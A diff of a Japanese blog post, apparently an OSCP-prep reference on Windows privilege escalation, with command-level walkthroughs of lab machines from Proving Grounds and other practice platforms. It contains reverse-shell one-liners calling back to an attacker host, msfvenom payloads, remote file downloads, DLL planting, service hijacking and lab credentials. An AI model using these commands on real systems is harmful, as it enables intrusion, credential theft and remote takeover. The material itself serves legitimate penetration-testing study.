@@ -1,9 +1,9 @@
 ---
-title: "Windows 権限昇格 — 60件のWriteupから見えたパターンと統計分析"
+title: "Windows 権限昇格 — 60件超のWriteup全網羅分析（OSCP対策版）"
 date: 2026-03-06
-description: "TryHackMe・HackTheBox・Proving Grounds の Windows マシン 60 件の Writeup を分析し、権限昇格手法の頻度・攻撃チェーン・ツール・防御策を体系的にまとめたリファレンス。"
+description: "TryHackMe・HackTheBox・Proving Grounds の全 Windows Writeup を分析した OSCP 対策リファレンス。Proving Grounds 全4マシンをコマンドレベルで詳解。Metasploit なし・手動手法のみ。"
 categories: [TechBlog]
-tags: [windows, privilege-escalation, kerberoasting, seimpersonate, potato, service-misconfig, pentest, oscp, active-directory]
+tags: [windows, privilege-escalation, kerberoasting, seimpersonate, potato, service-misconfig, pentest, oscp, active-directory, proving-grounds]
 mermaid: true
 content_lang: ja
 alt_en: /posts/tech-windows-privesc-summary/
@@ -11,24 +11,26 @@ alt_en: /posts/tech-windows-privesc-summary/
 
 ## TL;DR
 
-**60件のWindowsマシンWriteup**（TryHackMe 44件・HackTheBox 8件・Proving Grounds 8件）を分析した結果、6つの頻出権限昇格パターンが浮かび上がった。
+本ブログの全 Windows Writeup — **TryHackMe (44)・HackTheBox (8)・Proving Grounds (8)** — を **OSCP 試験スタイルの手動攻撃（Metasploit なし）** に絞って分析・体系化したリファレンス。
 
-**トークン悪用（SeImpersonatePrivilege → Potato / PrintSpoofer）**と**Active Directory 資格情報攻撃（Kerberoasting・AS-REP Roasting・GPP パスワード）**の2カテゴリで、観測された昇格パスの過半数を占める。
+Proving Grounds マシンは OSCP 試験難度に最も近いため、**コマンドレベルで全4マシンを詳解する**。
 
-**頻度ランキング（上位）**
+> **PG カテゴリについての注記:** `pg-apex`・`pg-bratarina`・`pg-clue` はこのブログで `[Proving Grounds, Windows]` に分類されているが、シェル出力・SMB バナー（`Samba, Ubuntu`・`/bin/bash`）から実際は **Linux ホスト**であることが確認できる。各エントリで実 OS を明記した上で全て収録している。
 
-| 順位 | 手法 | カテゴリ | 頻度 |
-|------|------|----------|------|
-| 1 | SeImpersonatePrivilege 悪用（Potato / PrintSpoofer） | トークン悪用 | ★★★★★ |
-| 2 | Kerberoasting（GetUserSPNs） | Active Directory | ★★★★★ |
-| 3 | サービス設定不備（binPath / 弱い ACL） | ローカル設定不備 | ★★★★ |
-| 4 | 書き込み可能スクリプト + 特権スケジューラー | ローカル設定不備 | ★★★★ |
-| 5 | GPP / cpassword / 保存済み資格情報 | 資格情報露出 | ★★★ |
-| 6 | AlwaysInstallElevated | ローカル設定不備 | ★★★ |
-| 7 | AS-REP Roasting + ACL チェーン | Active Directory | ★★★ |
-| 8 | カーネル / CVE エクスプロイト | 未パッチ CVE | ★★ |
-| 9 | 引用符なしサービスパス | ローカル設定不備 | ★★ |
-| 10 | 保存済み資格情報（Unattend.xml / レジストリ） | 資格情報露出 | ★★ |
+**頻度別 手法ランキング（OSCP 試験での利用可否付き）:**
+
+| 順位 | 手法 | カテゴリ | OSCP 試験で使用可能? |
+|------|------|----------|---------------------|
+| 1 | SeImpersonatePrivilege → Potato / PrintSpoofer | トークン悪用 | 可 |
+| 2 | Kerberoasting（GetUserSPNs） | Active Directory | 可 |
+| 3 | サービス設定不備（binPath / 弱い ACL） | ローカル設定不備 | 可 |
+| 4 | 書き込み可能スクリプト + 特権スケジューラー | ローカル設定不備 | 可 |
+| 5 | GPP / cpassword / 保存済み資格情報 | 資格情報露出 | 可 |
+| 6 | AlwaysInstallElevated | ローカル設定不備 | 可 |
+| 7 | AS-REP Roasting + ACL チェーン | Active Directory | 可 |
+| 8 | CVE / 公開エクスプロイト（searchsploit） | 既知 CVE | 可（手動のみ） |
+| 9 | LFI → 設定ファイル資格情報抽出 | Web 脆弱性 | 可 |
+| 10 | NTLM キャプチャ（Responder）→ hashcat | 資格情報悪用 | 可 |
 
 ---
 
@@ -37,7 +39,7 @@ alt_en: /posts/tech-windows-privesc-summary/
 ### プラットフォーム別 Writeup 数
 
 ```mermaid
-pie title Windows Writeup のプラットフォーム分布
+pie title Windowsタグ付き Writeup のプラットフォーム分布
     "TryHackMe" : 44
     "HackTheBox" : 8
     "Proving Grounds" : 8
@@ -51,212 +53,294 @@ pie title 権限昇格カテゴリの観測内訳
     "Active Directory / Kerberos" : 18
     "ローカル設定不備" : 15
     "資格情報露出" : 12
-    "未パッチ CVE / カーネル" : 8
-    "その他" : 5
+    "CVE / 公開エクスプロイト" : 10
+    "その他（直接 root）" : 3
 ```
-
-### カテゴリ別 手法と出現頻度
-
-| カテゴリ | 主な手法 | 推定出現割合 |
-|----------|---------|--------------|
-| トークン悪用 | SeImpersonate・Potato 系・PrintSpoofer | 約 37% |
-| Active Directory | Kerberoasting・AS-REP Roasting・GPP・DCSync・ACL 悪用 | 約 30% |
-| ローカル設定不備 | サービス設定・ACL・AlwaysInstallElevated・スケジュールタスク | 約 25% |
-| 資格情報露出 | Unattend.xml・レジストリ・ブラウザ保存パスワード | 約 20% |
-| CVE / カーネル | PrintDemon・WerTrigger・カーネルエクスプロイト | 約 13% |
-
-> ※ 1 マシンで複数手法を連鎖させることが多いため、合計は 100% を超える。
 
 ---
 
-## 手法別 詳細解説
+## Proving Grounds — 全 Writeup 詳細分析
 
-### 1. トークン悪用 — SeImpersonatePrivilege
+Proving Grounds マシンは OSCP 試験との親和性が最も高い。このセクションで全4マシンをコマンドレベルで解説する。
 
-**本データセットで最も頻出する Windows 権限昇格の基本プリミティブ。**
+### PG — Craft2（Windows 10）
 
-IIS・SQL Server・WinRM などのサービスアカウントには、デフォルトで `SeImpersonatePrivilege` が付与されている。このサービスを侵害した攻撃者は Potato 系エクスプロイトまたは PrintSpoofer を使い、**NT AUTHORITY\SYSTEM** へ昇格できる。
+**[→ 全 Writeup](/posts/pg-craft2/)**
 
-#### 確認コマンド
+| 項目 | 内容 |
+|------|------|
+| 実際の OS | Windows 10（Version 10.0.17763.2746） |
+| 侵入経路 | Bad-ODF NTLM キャプチャ → 資格情報再利用 → PHP Web シェル |
+| 権限昇格 | CVE-2020-1337（WerTrigger）— MySQL LOAD_FILE DLL インジェクション |
+| OSCP スタイル | 100% 手動 — Metasploit なし |
 
-```powershell
-whoami /priv
-# 確認対象:
-# SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
-```
-
-#### OS バージョン別 ツール選択
-
-| ツール | 対応 OS | 備考 |
-|--------|--------|------|
-| GodPotato | Win 8–11, Server 2012–2022 | 最も安定。まず試すべき第一候補 |
-| SweetPotato | 全 Windows | 最適手法を自動選択 |
-| PrintSpoofer | Win 10 / Server 2019 | Spooler 名前付きパイプを利用 |
-| RoguePotato | Win 10 1809+ / Server 2019+ | 攻撃者側ポート 135 の転送が必要 |
-| JuicyPotato | Win 10 1809 以前 | CLSID の個別指定が必要 |
+**フルアタックチェーン:**
 
 ```mermaid
-flowchart TD
-    A[whoami /priv → SeImpersonatePrivilege 確認] --> B{OS バージョンは?}
-    B -->|モダン Windows 全般| C[GodPotato]
-    B -->|自動選択が必要| D[SweetPotato]
-    B -->|Win 10 / Srv 2019| E[PrintSpoofer]
-    B -->|1809 以前| F[JuicyPotato]
-    C --> G[SYSTEM シェル取得]
-    D --> G
-    E --> G
-    F --> G
+flowchart LR
+    A[Bad-ODF.py → 悪意ある ODT] --> B[Responder が NTLMv2 ハッシュをキャプチャ]
+    B --> C[hashcat -m 5600 → winniethepooh]
+    C --> D[smbclient で WebApp 共有に書き込み]
+    D --> E[cmd.php アップロード → craft2\\apache として Web シェル]
+    E --> F[shell.exe アップロード → リバースシェル]
+    F --> G[chisel トンネル → MySQL ポート 3306 を公開]
+    G --> H[MySQL LOAD_FILE → DLL を System32 に書き込み]
+    H --> I[WerTrigger.exe → CVE-2020-1337 → SYSTEM]
 ```
 
-**観測された事例:**
-- [THM - Alfred](/posts/thm-alfred/) — Jenkins 弱認証 → `SeImpersonatePrivilege` → PrintSpoofer64 → SYSTEM
-- [TechBlog - Windows Potato PrivEsc](/posts/tech-windows-potato-privesc/) — Potato 系全ツールの総合リファレンス
-
----
-
-### 2. Kerberoasting
-
-**本データセットで最も頻出する Active Directory 昇格手法。**
-
-ドメインユーザーであれば誰でも、SPN（ServicePrincipalName）が設定されたアカウントの Kerberos サービスチケット（TGS）をリクエストできる。TGS はそのサービスアカウントのパスワードハッシュで暗号化されており、オフラインクラックが可能。
-
-#### 攻撃フロー
-
-```mermaid
-sequenceDiagram
-    participant A as 攻撃者（低権限ドメインユーザー）
-    participant DC as ドメインコントローラー（KDC）
-    participant H as hashcat（オフライン）
-
-    A->>DC: TGS リクエスト（GetUserSPNs.py）
-    DC->>A: TGS チケット（サービスアカウントハッシュで暗号化）
-    A->>H: hashcat -m 13100 ticket.txt rockyou.txt
-    H->>A: 平文パスワード取得
-    A->>A: psexec.py / evil-winrm でクラックアカウントに接続
-```
-
-#### コマンド
+**主要コマンド:**
 
 ```bash
-# SPN 列挙とチケットハッシュ取得
-python3 GetUserSPNs.py -request -dc-ip $ip DOMAIN/user:'password' -outputfile krbhash.txt
+# 1. 悪意のある ODF ドキュメント生成（開封時に NTLM を漏洩させる）
+python3 Bad-ODF.py   # 攻撃者 IP を入力 → bad.odt が生成される
 
-# TGS ハッシュのクラック
-hashcat -m 13100 -a 0 krbhash.txt /usr/share/wordlists/rockyou.txt
+# 2. NTLMv2 ハッシュをキャプチャ
+sudo responder -I tun0 -v
+# → THECYBERGEEK::CRAFT2:<ハッシュ>
+
+# 3. hashcat でクラック
+hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+# → winniethepooh
+
+# 4. 書き込み可能な SMB 共有にアクセス
+smbclient //$ip/Webapp -U 'thecybergeek%winniethepooh' -m SMB3 -c 'put ./cmd.php'
+
+# 5. リバースシェル DLL を生成
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o phoneinfo.dll
+
+# 6. chisel で MySQL ポートをトンネル
+./chisel server -p 8000 --reverse                              # 攻撃者側
+.\chisel.exe client $KALI:8000 R:3306:127.0.0.1:3306          # 標的側
+
+# 7. MySQL 経由で DLL を System32 に書き込み
+mysql -u root -h 127.0.0.1 -P 3306
+# > SELECT LOAD_FILE('C:\\Users\\Public\\phoneinfo.dll') INTO DUMPFILE "C:\\Windows\\System32\\phoneinfo.dll";
+
+# 8. WER が DLL をロードするよう誘導 → SYSTEM シェル取得
+certutil -urlcache -f http://$KALI/WerTrigger.exe WerTrigger.exe
+.\WerTrigger.exe
 ```
 
-**観測された事例:**
-- [HTB - Active](/posts/htb-active/) — GPP cpassword → `SVC_TGS` 取得 → Administrator を Kerberoast → `Ticketmaster1968`
-- [THM - Corp](/posts/thm-corp/) — `setspn` 列挙 → Domain Admin の `fela` → クラック → `rubenF124`
+**OSCP へのエッセンス:**
+- Responder + hashcat は OSCP で最も標準的な NTLM 資格情報取得ワークフロー
+- 内部サービスに直接到達できない場合は chisel でのポートフォワードが必須
+- `certutil -urlcache -f` は Windows でのファイルダウンロードの定番（PowerShell 不要）
+- CVE-2020-1337 は「DB の FILE 権限 → ファイルシステム書き込み → DLL ハイジャック」という創造的なチェーン
 
 ---
 
-### 3. サービス設定不備
+### PG — Apex（Linux/Samba — Windows タグ付き）
 
-**管理が行き届いていない Windows ホストで頻出するローカル権限昇格。**
+**[→ 全 Writeup](/posts/pg-apex/)**
 
-以下の 3 パターンが繰り返し観測された。
+| 項目 | 内容 |
+|------|------|
+| 実際の OS | **Linux（Ubuntu）** — ブログでは Windows タグ |
+| 侵入経路 | OpenEMR LFI（CVE-2018-17179）→ sqlconf.php 資格情報抽出 |
+| 権限昇格 | データベース資格情報の再利用（mysql -u openemr） |
+| OSCP スタイル | 手動 CVE 利用 |
 
-#### 3a. サービスバイナリの ACL 弱設定（binPath 書き換え）
-
-```cmd
-sc query state= all
-accesschk.exe /accepteula -uwcqv "Users" <service_name>
-sc config <service_name> binPath= "C:\PrivEsc\reverse.exe"
-sc stop <service_name> && sc start <service_name>
-```
-
-#### 3b. 引用符なしサービスパス
-
-スペースを含むサービスバイナリパスに引用符がない場合、パスの各セグメントに DLL/EXE を配置することでハイジャック可能。
-
-```cmd
-wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
-icacls "C:\Program Files\Vuln App\"
-```
-
-#### 3c. サービス DLL ハイジャック
-
-ディレクトリのパーミッションが弱い場合、特権サービスが読み込む DLL を置き換えて悪意のあるコードを実行できる。
-
-**観測された事例:**
-- [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/) — `accesschk` でサービス発見 → binPath 書き換え → SYSTEM
-- [THM - Steel Mountain](/posts/thm-steel-mountain/) — Rejetto HFS CVE → サービス設定悪用
-
----
-
-### 4. 書き込み可能スクリプト + 特権スケジューラー
-
-**SYSTEM 権限のスケジュールタスクがユーザー書き込み可能なスクリプトを実行する場合、非常に再現性が高い。**
-
-重要なのは「書き込めること」だけでなく、「特権コンテキストで定期実行されるかどうか」の確認。
-
-```cmd
-# winPEAS で確認すべき出力例:
-# File Permissions "C:\DevTools\CleanUp.ps1": Users [WriteData/CreateFiles]
-
-# スクリプトにペイロードを追記
-echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
-
-# スケジュールタスクの発火を待ちながらリバースシェルを受け取る
-rlwrap -cAri nc -lvnp 53
-```
+**アタックチェーン:**
 
 ```mermaid
-sequenceDiagram
-    participant W as winPEAS
-    participant A as 攻撃者
-    participant S as タスクスケジューラー（SYSTEM）
-    participant L as nc リスナー
-
-    W->>A: CleanUp.ps1 への WriteData 権限を報告
-    A->>A: タスクが SYSTEM 文脈で実行されることを確認
-    A->>A: echo reverse.exe >> CleanUp.ps1
-    A->>L: nc -lvnp 53 でリスナー起動
-    S->>S: タスク発火 → CleanUp.ps1 実行
-    S->>L: reverse.exe が SYSTEM として接続
+flowchart LR
+    A[SMB 匿名 → docs 共有 → OpenEMR PDF] --> B[OpenEMR 特定 → searchsploit]
+    B --> C[CVE-2018-17179 LFI → /etc/passwd 読み取り]
+    C --> D[LFI → sqlconf.php 読み取り → openemr:C78maEQUIEuQ]
+    D --> E[mysql -h ターゲット → DB アクセス]
 ```
 
-**観測された事例:**
-- [THM - Windows PrivEsc](/posts/thm-windows-privesc/) — `C:\DevTools\CleanUp.ps1` 書き込み可能 → nc でSYSTEM シェル受信
-
----
-
-### 5. GPP / 保存済み資格情報
-
-#### 5a. Group Policy Preferences（cpassword）
-
-旧来の Group Policy でローカルアカウントをデプロイする際、SYSVOL 共有の `Groups.xml` に AES 暗号化パスワード（`cpassword`）が保存されることがある。**暗号化キーは Microsoft によって公開済み**のため、ドメインユーザーであれば誰でも復号できる。
+**主要コマンド:**
 
 ```bash
-# Replication 共有から Groups.xml を取得
-smbclient //$ip/Replication -N
-# パス例: active.htb\Policies\...\MACHINE\Preferences\Groups\Groups.xml
+# SMB 列挙 — PDF から動作アプリを特定
+smbclient -L //$ip -N
+smbclient //$ip/docs -m SMB3   # OpenEMR の PDF が見つかる
 
-gpp-decrypt "<Groups.xml の cpassword 値>"
+# OpenEMR LFI エクスプロイト
+python3 49359.py http://$ip PHPSESSID=<session> /etc/passwd
+python3 49359.py http://$ip PHPSESSID=<session> /var/www/openemr/sites/default/sqlconf.php
+
+# 抽出した資格情報で MySQL 接続
+mysql -h $ip -u openemr -pC78maEQUIEuQ --skip-ssl
 ```
 
-**観測された事例:**
-- [HTB - Active](/posts/htb-active/) — `Groups.xml` から `SVC_TGS:GPPstillStandingStrong2k18` を取得
-
-#### 5b. Unattend.xml / Sysprep 資格情報
-
-Windows デプロイメント用ファイルに管理者資格情報が Base64 エンコードで残っているケース。
-
-```powershell
-Get-Content C:\Windows\Panther\Unattend\Unattended.xml
-# <Password><Value> を Base64 デコード
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<value>"))
-```
-
-**観測された事例:**
-- [THM - Corp](/posts/thm-corp/) — `Unattended.xml` → Administrator パスワード（Base64）→ evil-winrm で Administrator 接続
+**OSCP へのエッセンス:**
+- SMB 共有のファイル内容がアプリを特定し、searchsploit への直接パスを開く
+- LFI は設定ファイル（`sqlconf.php`・`.env`・`config.php`）への読み取りで資格情報を効率的に取得できる
+- LFI を持ったら必ず `/proc/self/cmdline` とアプリ固有の設定パスを試すこと
 
 ---
 
-### 6. AlwaysInstallElevated
+### PG — Bratarina（Linux/Samba — Windows タグ付き）
 
-`HKCU` と `HKLM` の両方で `AlwaysInstallElevated` が `1` に設定されている場合、一般ユーザーが SYSTEM 権限で MSI をインストールできる。
+**[→ 全 Writeup](/posts/pg-bratarina/)**
+
+| 項目 | 内容 |
+|------|------|
+| 実際の OS | **Linux（Samba）** — ブログでは Windows タグ |
+| 侵入経路 | SMB 匿名 → passwd.bak → OpenSMTPD RCE（CVE-2020-7247） |
+| 権限昇格 | エクスプロイト自体が root シェルを返すため個別の権限昇格ステップなし |
+| OSCP スタイル | searchsploit を用いた手動 CVE 利用 |
+
+**アタックチェーン:**
+
+```mermaid
+flowchart LR
+    A[SMB 匿名 → backups 共有] --> B[passwd.bak DL → ユーザー一覧: neil, postgres]
+    B --> C[nc $ip 25 → OpenSMTPD 6.6.1 バナー確認]
+    C --> D[searchsploit opensmtpd → EDB-47984 CVE-2020-7247]
+    D --> E[python3 47984.py $ip 25 payload → root シェル]
+```
+
+**主要コマンド:**
+
+```bash
+# SMB 匿名列挙
+smbclient "//$ip/backups" -N -m SMB3   # → passwd.bak ダウンロード
+
+# ポート 25 バナー確認
+nc -vn $ip 25   # → 220 bratarina ESMTP OpenSMTPD
+
+# エクスプロイトの検索と利用
+searchsploit opensmtpd
+searchsploit -m 47984
+python3 47984.py $ip 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$KALI\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
+```
+
+**OSCP へのエッセンス:**
+- SMB の匿名バックアップ共有は高確率でファイルを含む — 読み取れる全共有を必ず `ls` する
+- ポート 25 でバナー確認 → バージョン特定 → searchsploit は再現性の高いワークフロー
+- OpenSMTPD は root で動作するため、エクスプロイトで即座に root シェルを取得できる（権限昇格不要）
+- `searchsploit -m <EDB-ID>` でエクスプロイトをカレントディレクトリにコピーするのが定番
+
+---
+
+### PG — Clue（Linux/Debian — Windows タグ付き）
+
+**[→ 全 Writeup](/posts/pg-clue/)**
+
+| 項目 | 内容 |
+|------|------|
+| 実際の OS | **Linux（Debian）** — ブログでは Windows タグ |
+| 侵入経路 | Cassandra Web LFI（EDB-49362）→ 資格情報抽出 → FreeSWITCH RCE |
+| 権限昇格 | sudo 設定不備 → cassandra-web が root で起動 → LFI を再利用して SSH 秘密鍵を読み取り |
+| OSCP スタイル | 手動多段チェーン攻撃 |
+
+**アタックチェーン:**
+
+```mermaid
+flowchart LR
+    A[feroxbuster ポート 3000 → Cassandra Web 発見] --> B[LFI 49362 → /proc/self/cmdline]
+    B --> C[cassie:SecondBiteTheApple330 を抽出]
+    C --> D[LFI → freeswitch event_socket.conf.xml]
+    D --> E[StrongClueConEight021 を抽出]
+    E --> F[searchsploit freeswitch → EDB-47799 → freeswitch ユーザーで RCE]
+    F --> G[sudo -u root cassandra-web -B 0.0.0.0:1337]
+    G --> H[ポート 1337 で root として LFI → /root/.ssh/id_rsa 読み取り]
+    H --> I[ssh root@ip -i id_rsa]
+```
+
+**主要コマンド:**
+
+```bash
+# LFI でプロセスの資格情報を抽出
+python3 49362.py $ip -p 3000 ../../../../../../../../proc/self/cmdline
+# → /usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
+
+# LFI で FreeSWITCH 設定を読み取り
+python3 49362.py $ip -p 3000 ../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
+# → password: StrongClueConEight021
+
+# FreeSWITCH RCE（抽出したパスワードで認証）
+searchsploit freeswitch
+python3 47799.py $ip 'nc -e /bin/sh $KALI 3000'
+
+# 権限昇格: sudo で cassandra-web を root として起動 → 新たな LFI 面が生まれる
+sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:1337 -u cassie -p SecondBiteTheApple330
+# ポート 1337 の LFI が root 権限で動作するようになる
+python3 49362.py $ip -p 1337 ../../../../../../../../root/.ssh/id_rsa
+ssh root@$ip -i id_rsa
+```
+
+**OSCP へのエッセンス:**
+- LFI を持ったら `/proc/self/cmdline` を必ず試す — コマンドライン引数に平文パスワードが含まれることがある
+- サービス設定ファイル（freeswitch・apache・nginx）は資格情報の宝庫 — LFI があるなら必ず確認する
+- `sudo -l` → root でアプリを起動 → そのアプリ自身が LFI を持つ場合、チェーンを延長できる
+- root 権限の LFI から SSH 秘密鍵を抜き取るというパターンを頭に入れておく
+
+---
+
+## Windows 固有の権限昇格手法（OSCP リファレンス）
+
+### SeImpersonatePrivilege → トークン悪用
+
+```powershell
+whoami /priv   # → SeImpersonatePrivilege   Enabled を確認
+```
+
+```cmd
+:: ファイル転送
+certutil -urlcache -split -f http://$KALI/GodPotato.exe C:\Temp\GodPotato.exe
+
+:: GodPotato（Server 2012 ～ Windows 11 まで全対応）
+.\GodPotato.exe -cmd "nc.exe $KALI 4444 -e cmd.exe"
+
+:: PrintSpoofer（Windows 10 / Server 2019）
+.\PrintSpoofer64.exe -i -c cmd
+```
+
+**観測事例:** [THM - Alfred](/posts/thm-alfred/) — Jenkins → SeImpersonate → PrintSpoofer → SYSTEM
+
+---
+
+### Kerberoasting
+
+```bash
+python3 GetUserSPNs.py -request -dc-ip $ip DOMAIN/user:'pass' -outputfile hash.txt
+hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**観測事例:** [HTB - Active](/posts/htb-active/), [THM - Corp](/posts/thm-corp/)
+
+---
+
+### サービス設定不備
+
+```cmd
+accesschk.exe /accepteula -uwcqv "Users" *
+sc config <service> binPath= "C:\Temp\shell.exe"
+sc stop <service> && sc start <service>
+```
+
+**観測事例:** [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/)
+
+---
+
+### 書き込み可能スクリプト + スケジュールタスク
+
+```cmd
+:: winPEAS が報告: File Permissions "C:\DevTools\CleanUp.ps1": Users [WriteData/CreateFiles]
+echo C:\Temp\shell.exe >> C:\DevTools\CleanUp.ps1
+rlwrap -cAri nc -lvnp 443   :: タスク発火時に SYSTEM シェルを受信
+```
+
+**観測事例:** [THM - Windows PrivEsc](/posts/thm-windows-privesc/)
+
+---
+
+### GPP / cpassword
+
+```bash
+smbclient //$ip/Replication -N   # → Groups.xml を見つける
+gpp-decrypt "<cpassword>"
+```
+
+**観測事例:** [HTB - Active](/posts/htb-active/)
+
+---
+
+### AlwaysInstallElevated
 
 ```cmd
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -264,260 +348,187 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```
 
 ```bash
-# 悪意のある MSI を生成
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o privesc.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f msi -o shell.msi
 ```
 
 ```cmd
-msiexec /quiet /qn /i C:\PrivEsc\privesc.msi
+msiexec /quiet /qn /i C:\Temp\shell.msi
 ```
 
-**観測された事例:**
-- [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/) — 両レジストリキーが有効 → MSI ペイロード → SYSTEM
+**観測事例:** [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/)
 
 ---
 
-### 7. AS-REP Roasting + ACL チェーン（Active Directory）
-
-Kerberos 事前認証が無効なアカウントは、認証なしで AS-REP ハッシュを取得できる。BloodHound による ACL 分析と組み合わせることで、フルドメイン侵害へ到達できる。
+### AS-REP Roasting + BloodHound
 
 ```bash
-# AS-REP ローストableアカウントの列挙
 python3 GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip $ip -format hashcat
-
-# ハッシュのクラック（モード 18200）
 hashcat -m 18200 asrep.txt rockyou.txt
-
-# BloodHound で Domain Admin への ACL パスをマップ
-bloodhound-python -d htb.local -u svc-alfresco -p <password> -c All -ns $ip
+bloodhound-python -d htb.local -u svc-alfresco -p <pass> -c All -ns $ip
 ```
+
+**観測事例:** [HTB - Forest](/posts/htb-forest/)
+
+---
+
+### 保存済み資格情報
+
+```powershell
+Get-Content C:\Windows\Panther\Unattend\Unattended.xml
+cmdkey /list
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+findstr /si password *.txt *.xml *.ini *.config
+```
+
+**観測事例:** [THM - Corp](/posts/thm-corp/)
+
+---
+
+## OSCP 試験向け 権限昇格 判断フロー
 
 ```mermaid
-flowchart LR
-    A[AS-REP Roast → svc-alfresco ハッシュ取得] --> B[クラック → パスワード取得]
-    B --> C[WinRM で svc-alfresco シェル]
-    C --> D[BloodHound: svc-alfresco → Account Operators]
-    D --> E[Exchange Windows Permissions グループにユーザー追加]
-    E --> F[WriteDACL → DCSync 権限付与]
-    F --> G[secretsdump.py → 全ハッシュ取得]
-    G --> H[Pass-the-Hash → Domain Admin]
+flowchart TD
+    A[低権限 Windows シェル取得] --> B[whoami /all 実行]
+    B --> C{SeImpersonatePrivilege?}
+    C -->|有効| D[GodPotato / PrintSpoofer → SYSTEM]
+    C -->|なし| E[systeminfo → OS バージョン + パッチ確認]
+    E --> F{既知カーネル CVE?}
+    F -->|あり| G[searchsploit → 手動エクスプロイト]
+    F -->|なし| H[winPEAS フルスキャン]
+    H --> I{サービス / ACL / レジストリ問題?}
+    I -->|binPath 書き込み可| J[sc config → SYSTEM]
+    I -->|AlwaysInstallElevated| K[MSI ペイロード → SYSTEM]
+    I -->|書き込み可スケジュールタスク| L[ペイロード追記 → SYSTEM]
+    I -->|なし| M{資格情報は?}
+    M -->|Unattend / cmdkey / レジストリ| N[横移動または直接管理者接続]
+    M -->|なし| O[AD 環境なら BloodHound]
 ```
-
-**観測された事例:**
-- [HTB - Forest](/posts/htb-forest/) — enum4linux でユーザー列挙 → `svc-alfresco` を AS-REP Roast → BloodHound ACL チェーン → DCSync → Domain Admin
 
 ---
 
-### 8. CVE / カーネルエクスプロイト
+## ファイル転送 — OSCP 必須コマンド集
 
-他の手法が使えない場合、既知のカーネル脆弱性や特定 CVE が信頼性の高いパスを提供する。
+```cmd
+:: certutil — 全 Windows にプリインストール済み、最も安定
+certutil -urlcache -split -f http://$KALI:8000/file.exe C:\Temp\file.exe
 
-| CVE | 手法 | 対象 |
-|-----|------|------|
-| CVE-2020-1337 | WerTrigger — WER 経由の DLL インジェクション | Windows 10 / Server 2016+ |
-| MS16-032 | Secondary Logon Handle 権限昇格 | Win 7–10, Server 2008–2012 |
-| MS15-051 | Win32k.sys カーネル権限昇格 | Win 7–8.1, Server 2008–2012 |
-| CVE-2018-8120 | Win32k NULL ポインタ参照 | Windows 7 / Server 2008 R2 |
+:: curl（Windows 10 以降ビルトイン）
+curl http://$KALI:8000/file.exe -o C:\Temp\file.exe
 
-```bash
-# CVE-2020-1337（WerTrigger）の流れ — PG Craft2
-# 1. 悪意のある DLL を生成
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o phoneinfo.dll
-
-# 2. MySQL の LOAD_FILE で System32 へ書き込み（chisel トンネル経由）
-mysql -u root -h 127.0.0.1 -P 3306
-> SELECT LOAD_FILE('C:\\Users\\Public\\phoneinfo.dll') INTO DUMPFILE "C:\\Windows\\System32\\phoneinfo.dll";
-
-# 3. WerTrigger で DLL をロードさせる
-certutil -urlcache -f http://$KALI/WerTrigger.exe WerTrigger.exe
-.\WerTrigger.exe
+:: bitsadmin（古いシステム向け）
+bitsadmin /transfer job http://$KALI:8000/file.exe C:\Temp\file.exe
 ```
 
-**観測された事例:**
-- [PG - Craft2](/posts/pg-craft2/) — Bad-ODF NTLM キャプチャ → hashcat → SMB 経由 Web シェル → chisel トンネル → CVE-2020-1337 → SYSTEM
-- [THM - Retro](/posts/thm-retro/) — WordPress 資格情報再利用 → RDP → カーネルエクスプロイト → SYSTEM
+```bash
+# Kali 側でファイルを配信
+python3 -m http.server 8000
+impacket-smbserver share . -smb2support -username guest -password ""
+```
+
+---
+
+## chisel によるポートフォワード
+
+```bash
+# 攻撃者側
+./chisel server -p 8000 --reverse
+
+# 標的側（Windows）— 内部 MySQL を公開
+.\chisel.exe client $KALI:8000 R:3306:127.0.0.1:3306
+
+# SOCKS5 プロキシ（内部ネットワーク全体へのアクセス）
+.\chisel.exe client $KALI:8000 R:socks
+```
 
 ---
 
 ## 列挙チェックリスト
 
-特定手法を試みる前に、体系的な列挙パスを実施する。**winPEAS** か手動チェックリストで主要カテゴリをカバーする。
-
 ```powershell
-# ── 基本情報確認 ──
-whoami /all                         # トークン権限・グループメンバーシップ
-systeminfo                          # OS バージョン・インストール済みパッチ
-wmic qfe get Caption,HotFixID       # 適用パッチ一覧
-
-# ── サービス / バイナリ悪用 ──
+whoami /all
+systeminfo
+wmic qfe get Caption,HotFixID
 sc query state= all
 accesschk.exe /accepteula -uwcqv "Users" *
 wmic service get name,pathname,startmode | findstr /iv "C:\Windows\\" | findstr /iv "\""
-
-# ── レジストリ確認 ──
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
-
-# ── 資格情報探索 ──
